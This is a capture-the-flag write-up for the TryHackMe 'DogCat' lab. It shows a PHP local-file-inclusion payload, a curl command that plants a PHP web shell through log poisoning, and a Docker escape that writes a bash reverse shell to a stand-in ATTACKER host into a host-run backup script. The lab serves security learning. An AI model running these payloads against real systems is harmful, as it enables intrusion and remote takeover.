---
title: "TryHackMe: DogCat — Writeup"
date: 2022-04-06 10:00:00 +0800
categories: [TryHackMe]
tags: [linux, ctf, lfi, php, docker, priv-esc]
---

## Overview

**DogCat** is a medium TryHackMe room with a PHP LFI vulnerability, log poisoning for RCE, and a Docker container escape via a writable backup script. Four flags in total.

---

## Recon

```bash
nmap -sC -sV 10.10.x.x
```

Port 80 — simple PHP site that loads images via `?view=dog` or `?view=cat`.

---

## LFI Discovery

The `view` parameter is directly passed to PHP's `include()`. Tested:

```
http://10.10.x.x/?view=php://filter/convert.base64-encode/resource=index
```

Returns base64-encoded `index.php` source. Decoded it:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
include $_GET['view'] . $ext;
```

The `ext` parameter controls the file extension appended. Setting `ext` to empty string allows reading arbitrary files:

```
?view=../../../../etc/passwd&ext=
```

---

## Log Poisoning → RCE

Poison the Apache access log by injecting PHP code in the User-Agent:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.10.x.x/
```

Then include the log:

```
?view=../../../../var/log/apache2/access.log&ext=&cmd=id
```

Code executes — `www-data`. Set up reverse shell and stabilised with Python PTY.

---

## Flags 1 & 2

```bash
find / -name flag*.txt 2>/dev/null
```

Flag 1 in `/var/www/html`, Flag 2 in `/root`.

---

## Docker Escape — Flag 3 & 4

```bash
cat /proc/1/cgroup   # confirms we're inside a container
```

Found writable backup script at `/opt/backups/backup.sh` that runs on the host via a bind-mounted cron:

```bash
echo '#!/bin/bash' > /opt/backups/backup.sh
echo 'bash -i >& /dev/tcp/ATTACKER/6666 0>&1' >> /opt/backups/backup.sh
chmod +x /opt/backups/backup.sh
```

Waited — shell returned as **root on the host**. Flags 3 and 4 retrieved from host `/root`.

---

## Key Takeaway

LFI + log poisoning is a classic combo. Docker doesn't automatically mean isolation — a writable bind-mounted script executing on the host is a container escape waiting to happen.
